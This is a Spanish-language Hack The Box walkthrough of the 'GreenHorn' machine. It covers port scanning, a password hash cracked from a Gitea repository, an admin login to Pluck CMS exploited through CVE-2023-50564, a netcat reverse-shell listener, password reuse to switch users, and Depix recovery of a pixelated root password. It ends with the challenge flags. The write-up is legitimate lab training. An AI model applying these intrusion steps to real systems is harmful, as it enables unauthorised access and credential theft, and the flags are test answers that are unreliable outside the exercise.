---
tags:
title: GreenHorn - Easy (HTB)
permalink: /GreenHorn-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento 

```bash 
nmap -sCV -p22,80,3000 10.10.11.25
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 14:50 EDT
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Welcome to GreenHorn ! - GreenHorn
|_Requested resource was http://greenhorn.htb/?file=welcome-to-greenhorn
|_http-generator: pluck 4.7.18
3000/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=372220dd6ee0c6ee; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=ulGkHtbBU1wU8f1oBZsRMbmfnbE6MTc1ODIyMTQyMjQ5NDU5NzgzNg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 18 Sep 2025 18:50:22 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=0dc0f316cf177c49; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=cITRvqtljl168G1bJwvibYH_MrI6MTc1ODIyMTQyNDYxMDIxMzg3OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 18 Sep 2025 18:50:24 GMT
|_    Content-Length: 0
|_http-title: GreenHorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=9/18%Time=68CC546D%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2536,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:372220dd6ee0c6ee;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=ulGkHtbBU1wU8f1oBZsRMbmfnbE6MTc1ODIyMTQyMjQ5NDU5NzgzNg;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2018\x20Sep\x202025\x2018:50:22\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x20r
SF:el=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR3Jl
SF:ZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9
SF:ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm
SF:4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJza
SF:XplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowe
SF:d\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,\x2
SF:0private,\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_
SF:gitea=0dc0f316cf177c49;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-
SF:Cookie:\x20_csrf=cITRvqtljl168G1bJwvibYH_MrI6MTc1ODIyMTQyNDYxMDIxMzg3OQ
SF:;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-
SF:Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2018\x20Sep\x202025\x2018:50:2
SF:4\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.14 seconds
```

## Service enumeration 

### greenhorn.htb / Port 80 

Por el puerto `80` se nos presenta esta web de la cual no podemos obtener nada de información.
![{E9CAA2A1-F395-4307-ACFF-CA3C7EA42DD9}](images/{E9CAA2A1-F395-4307-ACFF-CA3C7EA42DD9}.png)
Pero en la parte de abajo hay un boton de `admin` del cual si hacemos click, nos redirigue a un panel de login en el que requerimos de credenciales para iniciar sesion, ya que no hay un panel de registro dentro de la misma.

![{EE769C7C-036F-4BE9-BA79-07286F74232C}](images/{EE769C7C-036F-4BE9-BA79-07286F74232C}.png)

De igual manera, logramos ver que corre la version `4.7.18` de `pluck` el cual es un `cms`, si buscamos por vulnerabilidades sobre este servicio vemos que cuenta con una la cual tiene el identificador de `CVE-2023-50564` del cual se trata de una ejecucion remota de comandos al cargar un `zip` malicioso en la instalacion de un modulo. Pero requerimos de algunas credenciales para acceder al panel y lograr esta explotacion.
#### Gobuster enumeration

```bash 
gobuster dir -u http://greenhorn.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 -x php,txt,js,html,bak,php.bak,zip  --exclude-length 0
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://greenhorn.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,js,html,bak,php.bak,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://greenhorn.htb/images/]
/login.php            (Status: 200) [Size: 1242]
/docs                 (Status: 301) [Size: 178] [--> http://greenhorn.htb/docs/]
/files                (Status: 301) [Size: 178] [--> http://greenhorn.htb/files/]
/data                 (Status: 301) [Size: 178] [--> http://greenhorn.htb/data/]
/admin.php            (Status: 200) [Size: 4026]
/install.php          (Status: 200) [Size: 4035]
/robots.txt           (Status: 200) [Size: 47]
/requirements.php     (Status: 200) [Size: 4047]
```

Vemos un `robots.txt` el cual puede contener rutas adicionales las cuales podamos enumerar.

![{21FEAE76-64B9-47F8-8947-66EA7746D18F}](images/{21FEAE76-64B9-47F8-8947-66EA7746D18F}.png)

Si nos dirigimos al directorio `data` nos redirige a la pagina principal, y en el `docs` no tenemos acceso a listar el contenido ya que nos devuelve un codigo de estado `403`

### Port 3000 - Gitea

`Gitea` es el servicio que corre por dicho puerto al ir a esa pagina tenemos la posibilidad de registrarnos ya que no contamos con credenciales previas, una vez registrados si nos vamos a la seccion de `explore`, vemos un repositorio que hace referencia a la pagina.

![{83538F80-B5CE-4691-803E-61F61DDF0207}](images/{83538F80-B5CE-4691-803E-61F61DDF0207}.png)

Si revisamos dicho repositorio en la ruta `greenhorn/data/settings` hay un archivo que resulta interesante.

![{9AC5C03E-FBF1-447D-A806-F6064DF29967}](images/{9AC5C03E-FBF1-447D-A806-F6064DF29967}.png)

Al parecer es un `hash` encriptado, vamos a la pagina de [crackstation](https://crackstation.net/) para ver si logramos romperlo

![Untitled 4 1](images/Untitled 4 1.jpg)

Logramos romperlo y nos descrubrio la password : `iloveyou1`, ahora si con credenciales validas podemos intentar loguearnos en la pagina para poder pasar con la explotacion

![Untitled 5 1](images/Untitled 5 1.jpg)

Con exito logramos loguearnos.
# Explotacion

Para la explotacion de este `cve` desarrolle mi propio exploit que automatiza cada paso de la explotacion: 

- Creacion de un `PHP` malicioso
- Comprimir el archivo
- Ejecucio de comandos remotos

Preparamos nuestro listener con `nc`.
```bash 
nc -nlvp 4444       
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.25] 35600
whoami
www-data
```
# Post - Explotacion / Privilege escalation

Luego de realizar el tratamiento de la `tty` procedemos a la enumeración para pivotar a algun usuario del sistema ya que estamos como el usuario `www-data`.

Vemos que usuarios tienen asignada una bash, y vemos al usuario `junior`, como tenemos credenciales previas podemos probar si estas se reutilizan para este usuario.
```bash 
cat /etc/passwd | grep -i "sh$"
root:x:0:0:root:/root:/bin/bash
git:x:114:120:Git Version Control,,,:/home/git:/bin/bash
junior:x:1000:1000::/home/junior:/bin/bash
```

Intentamos usarlas.

```bash 
su junior
Password:iloveyou1
junior@greenhorn:/var/www/html/pluck/docs$ whoami
junior
```

Vemos que efectivamente si, las credenciales se reutilizan. al ir al directorio personal de `junior` vemos un archivo `pdf`.

```bash 
ls
 user.txt  'Using OpenVAS.pdf'
```

Lo pasamos a nuestra maquina para ver su contenido

![{50F65BA6-F772-4A0C-BC60-9ED061568884}](images/{50F65BA6-F772-4A0C-BC60-9ED061568884}.png)

Vemos que habla que solo `OpenVAS` puede ser usado por `root` y con la contraseña que esta debajo pero esta pixeleada, podriamos jugar con algunas tools para depixelear lo censurado y por lo menos recuperar un cierto porcentaje de la imagen original.
[Tools](https://github.com/spipm/Depixelization_poc)

Clonamos el repositorio
```bash 
git clone https://github.com/spipm/Depixelization_poc
```

Y corremos el script pasandole nuestro archivo previamente guardado como `.png`

```bash 
python3 depix.py -p ../pixelado.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png 
```

Y el archivo depixelado se nos guarda en el mismo directorio con el nombre de `output.png`, asi que toca ver que pudo recuperar de la imagen original.

![{9FE8C737-3828-477A-ADB1-B22DCE2934C3}](images/{9FE8C737-3828-477A-ADB1-B22DCE2934C3}.png)

Lo que nos da como resultado una frase que dice: `side from side the other side side from side the otherside`, podemos probar en sacarle los espacios y probarlas como contraseña para `root`.

```bash 
echo -e 'side from side the other side side from side the otherside' | tr -d ' '
sidefromsidetheothersidesidefromsidetheotherside
```

```bash 
su root
Password: 
root@greenhorn:/home/junior# whoami
root
```

# Flags

### User 
`2958f4dae7e6d1b69fd461b776380992`

### Root
`1f318c3b7dbd71824d76acefec161736`

`~Happy Hacking.`



